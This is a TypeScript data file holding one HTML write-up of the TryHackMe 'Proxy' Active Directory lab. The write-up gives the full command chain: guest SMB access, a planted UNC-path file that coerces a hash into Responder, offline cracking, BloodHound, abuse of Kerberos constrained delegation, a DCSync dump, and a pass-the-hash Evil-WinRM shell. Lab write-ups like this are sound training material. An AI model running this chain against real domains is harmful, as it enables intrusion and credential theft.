export interface Writeup {
  slug: string;
  title: string;
  excerpt: string;
  date: string;
  readTime: string;
  platformTag: "TryHackMe" | "BlockSec" | "Bug Bounty" | string;
  tags: string[];
  contentHtml: string;
}

export const writeups: Writeup[] = [
  {
    slug: "tryhackme-proxy-walkthrough",
    title: "TryHackMe: Proxy Walkthrough",
    excerpt: "End-to-end compromise of an Active Directory Domain Controller: anonymous SMB share discovery, NetNTLMv2 coercion with Responder, BloodHound mapping, and Kerberos Constrained Delegation exploitation.",
    date: "Oct 2026",
    readTime: "7 min",
    platformTag: "TryHackMe",
    tags: ["ActiveDirectory", "AD Pentesting"],
    contentHtml: `
      <b>Room Link: </b> <u><a href="https://tryhackme.com/room/proxychallenge" target="_blank" rel="noopener noreferrer">https://tryhackme.com/room/proxychallenge</a></u>
      <h2>Summary</h2>
      <p><strong>Proxy</strong> is an Active Directory machine on TryHackMe. The objective is to navigate an AD environment, intercept service credentials, and escalate to Domain Administrator through Kerberos abuse.</p>
      
      <ul>
        <li><strong>Recon:</strong> Fast port discovery with RustScan & Nmap fingerprinting (Ports 53, 88, 389, 445).</li>
        <li><strong>SMB Enumeration:</strong> Anonymous guest access to <code>IT-Shared</code> exposing staff onboarding notes.</li>
        <li><strong>Domain Graph Analysis:</strong> BloodHound enumeration discovering <code>AllowedToDelegate</code> on <code>svc.scanner</code>.</li>
        <li><strong>Privilege Escalation:</strong> Kerberos Constrained Delegation abuse with <code>Impacket-getST.py</code>, DCSync hash dumping, and WinRM shell.</li>
      </ul>

      <h2>1. Reconnaissance & Port Scanning</h2>
      <p>We initiate the assessment with <strong>RustScan</strong> to rapidly discover open ports, piping them directly to Nmap for service detection:</p>
      <pre><code>rustscan -a 10.114.168.198 -b 500 --top -- -sC -sV -Pn -oN nmap_proxy.txt</code></pre>
      
      <img src="/images/writeups/Proxy/rustscan.webp" alt="RustScan Port Discovery" class="rounded border border-border my-4 w-full" />
      <img src="/images/writeups/Proxy/rustscan-nmap.webp" alt="Nmap Service Scan" class="rounded border border-border my-4 w-full" />
      
      <p>The scan reveals a Windows Domain Controller (<strong>DC01.ctf.local</strong>):</p>
      <ul>
        <li><strong>Port 53:</strong> Microsoft DNS</li>
        <li><strong>Port 88:</strong> Kerberos (Domain Controller identifier)</li>
        <li><strong>Port 135:</strong> MSRPC</li>
        <li><strong>Port 389 / 3268:</strong> LDAP / Global Catalog</li>
        <li><strong>Port 445:</strong> SMB</li>
      </ul>

      <h2>2. SMB Share Enumeration & Host Entry</h2>
      <p>Using <strong>NetExec (nxc)</strong>, we test for null and guest SMB authentication:</p>
      <pre><code>nxc smb 10.114.168.198 -u 'guest' -p '' --shares</code></pre>
      
      <img src="/images/writeups/Proxy/nxc_smb_shares.webp" alt="SMB Shares Enumeration" class="rounded border border-border my-4 w-full" />
      
      <p>The target allows guest access to <code>IT-Shared</code> with <strong>READ and WRITE</strong> permissions. We connect interactively with <code>smbclient</code> and download all documents:</p>
      <pre><code>smbclient //10.114.168.198/IT-Shared -N
smb: \\> dir
smb: \\> mget *</code></pre>

      <img src="/images/writeups/Proxy/smb_share_data.webp" alt="SMB Shared Files" class="rounded border border-border my-4 w-full" />
      <img src="/images/writeups/Proxy/smb_share_data_file.png" alt="Inspecting Onboarding Checklist" class="rounded border border-border my-4 w-full" />

      <p>In <code>IT-Onboarding-Checklist.txt</code>, we uncover a crucial operational detail: <em>an automated scanner running under <code>svc.scanner</code> processes newly dropped files every 2 minutes</em>.</p>
      
      <p>We generate the <code>/etc/hosts</code> entry using NetExec:</p>
      <pre><code>nxc smb 10.114.168.198 -u 'guest' -p '' --generate-hosts-file host</code></pre>
      <img src="/images/writeups/Proxy/nxc_generate-host-file.webp" alt="Generate hosts entry" class="rounded border border-border my-4 w-full" />

      <h2>3. Credential Harvesting (Responder & John)</h2>
      <p>Since <code>svc.scanner</code> inspects new files, we can coerce an SMB authentication attempt by placing a PowerShell file that calls a UNC path pointing to our listener.</p>
      
      <p>Start Responder on the VPN tunnel interface:</p>
      <pre><code>sudo responder -I tun0 -dvw</code></pre>
      <img src="/images/writeups/Proxy/responder.webp" alt="Starting Responder" class="rounded border border-border my-4 w-full" />

      <p>We upload a one-line PowerShell script referencing our IP:</p>
      <pre><code>Get-ChildItem //192.168.131.251/t.txt</code></pre>
      <img src="/images/writeups/Proxy/smb_upload_file.webp" alt="Uploading script to SMB share" class="rounded border border-border my-4 w-full" />

      <p>Within 2 minutes, Responder catches the incoming NetNTLMv2 hash from <code>svc.scanner</code>:</p>
      <img src="/images/writeups/Proxy/got_the_hash.webp" alt="Captured NetNTLMv2 Hash" class="rounded border border-border my-4 w-full" />

      <p>We save the complete hash line and crack it offline using <strong>John the Ripper</strong>:</p>
      <pre><code>john hash --wordlist=/usr/share/wordlists/rockyou.txt</code></pre>
      <img src="/images/writeups/Proxy/john_crack_hash.webp" alt="Cracking Hash with John" class="rounded border border-border my-4 w-full" />

      <p>We verify the cracked credentials against the Domain Controller and list active users:</p>
      <pre><code>nxc smb 10.114.168.198 -u 'svc.scanner' -p '&lt;PASSWORD&gt;' --users</code></pre>
      <img src="/images/writeups/Proxy/nxc_smb_list_users.webp" alt="Verifying Credentials" class="rounded border border-border my-4 w-full" />

      <h2>4. Active Directory Graph Analysis (BloodHound)</h2>
      <p>With valid domain credentials, we run <code>bloodhound-python</code> to ingest domain objects, memberships, and ACLs:</p>
      <pre><code>bloodhound-python -u 'svc.scanner' -p '&lt;PASSWORD&gt;' -d ctf.local -dc DC01.ctf.local -ns 10.114.168.198 -c ALL --zip</code></pre>
      <img src="/images/writeups/Proxy/bloodhound_enum.webp" alt="BloodHound Ingestion" class="rounded border border-border my-4 w-full" />

      <p>Uploading the zip to BloodHound reveals that <code>svc.scanner</code> has <strong>AllowedToDelegate</strong> permissions targeting <code>cifs/DC01.ctf.local</code> on the Domain Controller:</p>
      <img src="/images/writeups/Proxy/bloodhound_enum_graph.png" alt="BloodHound Graph" class="rounded border border-border my-4 max-w-md mx-auto block shadow-sm" />
      <img src="/images/writeups/Proxy/bloodhound_enum_graph_abuse.png" alt="BloodHound Abuse Info" class="rounded border border-border my-4 max-w-md mx-auto block shadow-sm" />

      <h2>5. Privilege Escalation: Kerberos Constrained Delegation</h2>
      <h3>Why is Constrained Delegation Vulnerable?</h3>
      <p>Constrained Delegation allows a service account (<code>svc.scanner</code>) to impersonate users to a specific SPN (<code>cifs/DC01.ctf.local</code>).</p>
      <p>Using the Kerberos Service-for-User (S4U) extensions:</p>
      <ul>
        <li><strong>S4U2self:</strong> The account requests a Kerberos ticket to <em>itself</em> on behalf of any arbitrary domain user (including <code>Administrator</code>), without requiring that user's password.</li>
        <li><strong>S4U2proxy:</strong> The account then exchanges that ticket with the KDC for a valid service ticket to access the delegated target (<code>cifs/DC01.ctf.local</code>) as the impersonated user.</li>
      </ul>

      <p>We abuse this mechanism to forge a service ticket for <strong>Administrator</strong> using Impacket's <code>getST.py</code>:</p>
      <pre><code>impacket-getST ctf.local/svc.scanner:'&lt;PASSWORD&gt;' -spn cifs/DC01.ctf.local -impersonate Administrator -dc-ip DC01.ctf.local</code></pre>
      <img src="/images/writeups/Proxy/impacket-getST.webp" alt="Forging Ticket with getST" class="rounded border border-border my-4 w-full" />

      <p>We export the ticket into our shell session:</p>
      <pre><code>export KRB5CCNAME=Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache</code></pre>
      <img src="/images/writeups/Proxy/export.webp" alt="Exporting KRB5CCNAME" class="rounded border border-border my-4 w-full" />

      <p>With administrative CIFS access, we perform a DCSync dump against the Domain Controller without requiring passwords (<code>-k -no-pass</code>):</p>
      <pre><code>impacket-secretsdump -k -no-pass ctf.local/Administrator@DC01.ctf.local</code></pre>
      <img src="/images/writeups/Proxy/impacket-secretdump.webp" alt="DCSync SecretsDump" class="rounded border border-border my-4 w-full" />

      <p>Secretsdump dumps the NTDS database, exposing the built-in Administrator NTLM hash. We gain an interactive administrative shell using <strong>Evil-WinRM</strong>:</p>
      <pre><code>evil-winrm -u Administrator -H &lt;ADMIN_NTLM_HASH&gt; -i 10.114.168.198</code></pre>
      <img src="/images/writeups/Proxy/evil-winrm.png" alt="Administrator Shell with Evil-WinRM" class="rounded border border-border my-4 w-full" />
    `,
  },
];
